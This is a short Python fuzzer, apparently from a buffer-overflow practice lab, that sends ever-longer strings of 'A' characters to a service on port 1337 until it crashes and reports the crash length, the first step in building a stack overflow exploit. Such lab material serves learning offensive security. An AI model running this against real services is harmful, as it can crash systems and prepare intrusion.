#!/usr/bin/env python3

# Call like
# $ python3 fuzzer.py "10.10.X.X" 1

import socket, time, sys

ip = sys.argv[1]
id = sys.argv[2]

port = 1337
timeout = 5
prefix = "OVERFLOW" + id + " "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
